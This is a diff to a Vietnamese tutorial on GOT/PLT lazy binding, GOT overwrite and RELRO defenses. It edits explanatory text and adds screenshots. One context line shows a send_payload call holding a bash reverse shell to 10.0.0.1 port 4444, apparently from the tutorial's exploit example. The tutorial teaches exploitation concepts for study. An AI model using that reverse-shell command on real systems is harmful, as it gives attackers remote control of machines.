@@ -296,7 +296,8 @@ $\rightarrow$ **Điểm mấu chốt**: Vì đây là lần đầu tiên, ô GOT
 * **(4)** Tại địa chỉ 4005a0 (PLT[0]), chương trình thực hiện:
     * `pushq *GOT[1]`: Đẩy địa chỉ của link_map lên stack. Đây là "bản đồ" giúp trình liên kết biết danh sách các thư viện đang hiện có.
     * `jmpq *GOT[2]`: Nhảy đến địa chỉ lưu trong GOT[2].
-$\rightarrow$ PLT[0] đóng vai trò như một bộ nạp dữ liệu chung, gom đủ thông tin về thư viện (từ GOT[1]) và định danh hàm (đã được push từ bước 3) để chuyển giao cho trình liên kết.
+
+$\rightarrow$ Từ các lệnh trên ta có thể thấy PLT[0] đóng vai trò như một bộ nạp dữ liệu chung, gom đủ thông tin về thư viện (từ GOT[1]) và định danh hàm (đã được push từ bước 3) để chuyển giao cho trình liên kết.
 
 * **(5)** và **(6)** Lệnh `jmpq *GOT[2]` dẫn luồng thực thi tìm đến địa chỉ của trình liên kết động. Lúc này, hàm `_dl_runtime_resolve` bên trong ld-linux-x86-64.so.2 sẽ tiếp quản.
     * Hành động của Linker:
@@ -306,24 +307,22 @@ $\rightarrow$ PLT[0] đóng vai trò như một bộ nạp dữ liệu chung, go
     * Sau khi tìm thấy địa chỉ thực (ví dụ: `0x7ffff7a61230`), trình liên kết động thực hiện một bước cực kỳ quan trọng (mũi tên cam số 7): Ghi đè địa chỉ thực này vào ô GOT[3].
     
     $\rightarrow$ Mục đích: Từ đó về sau, GOT[3] sẽ không trỏ ngược về PLT nữa mà trỏ thẳng tới libc.
-<liệu có nên đặt một cái ảnh cho thấy bảng GOT đã cập nhật ở đây không? hay để chỗ khác?>
+
+    <details>
+        <summary>Từ các lần sau, quy trình gọi hàm sẽ trông kiểu như thế này</summary>
+        ---
+        <br>
+        <img width="1906" height="725" alt="Screenshot 2026-05-06 181433" src="https://github.com/user-attachments/assets/493f84ff-6b54-406a-837f-31210bbd9999" />
+        <br>
+        ---
+    </details>
 * **(8)**: Thực thi hàm lần đầu tiên
     * Sau khi đã cập nhật GOT, trình liên kết không bắt chương trình phải gọi lại từ đầu. Nó thực hiện bước nhảy cuối cùng đưa luồng thực thi đến thẳng địa chỉ thực của hàm `puts` trong thư viện chia sẻ.
     * Hàm `puts` thực thi mã lệnh thực tế của nó và trả kết quả về cho chương trình.
-#### Trạng thái 3: Các lần gọi sau (Post-Resolution)
-Những lần tiếp theo chương trình gọi `puts("Hi");`, CPU lại chui vào `puts@plt` và chạy lệnh dòng (1):
+#### Trạng thái 2: Các lần gọi sau (Post-Resolution)
+Những lần tiếp theo chương trình gọi `puts();`, CPU nhảy một phát sang `libc` luôn, không cần đi qua `dl_runtime_resolve` nữa.
 
-```assembly
-0x555555555030 <puts@plt>:
-  jmp QWORD PTR [rip+0x2fca]  ; Đọc địa chỉ từ GOT
-```
-Lúc này, ô nhớ trong GOT đã chứa địa chỉ thật:
-```assembly
-0x555555558018 <puts@got.plt>: 0x00007ffff7a91da0  (Địa chỉ trong libc.so)
-```
-CPU nhảy một phát sang `libc` luôn, vô cùng trơn tru, không cần đi qua "Phù thủy" nữa.
-
-<img: ảnh minh họa trạng thái Post-Resolution: Lệnh jmp trong PLT trỏ vào bảng GOT, bảng GOT giờ đây trỏ thẳng một đường mũi tên dài sang vùng nhớ của thư viện Libc>
+<img width="1891" height="731" alt="Screenshot 2026-05-06 182620" src="https://github.com/user-attachments/assets/efec1a4f-cf8d-4fae-9402-6bfcbeaf796c" />
 
 ---
 
@@ -365,7 +364,7 @@ send_payload("bash -c 'sh -i >& /dev/tcp/10.0.0.1/4444 0>&1'")
 ```
 
 --- 
-*Đây là toàn bộ giải phẫu học của GOT. Bạn có thể sử dụng các thẻ `<img: ...>` để bổ sung hình ảnh sơ đồ vào đúng các vị trí đã đánh dấu để tạo ra một bản tài liệu hoàn hảo về mặt thị giác.*
+
 ### 5. Phòng thủ bằng RELRO (Relocation Read-Only)
 * **Partial RELRO:** Bảng `.got.plt` vẫn cho phép ghi. KHÔNG cản được GOT Overwrite.
 * **Full RELRO:** Khi chương trình khởi động, Loader sẽ phân giải sẵn TẤT CẢ các hàm, điền vào GOT, rồi dùng syscall `mprotect` khóa cứng vùng nhớ GOT thành **Chỉ Đọc (Read-Only)**. GOT Overwrite chết đứng. Hacker lúc này phải nhắm vào các mục tiêu khó hơn như `__free_hook`, `__malloc_hook` của libc, cấu trúc luồng của tcache, hoặc vtable của C++ Heap Objects.
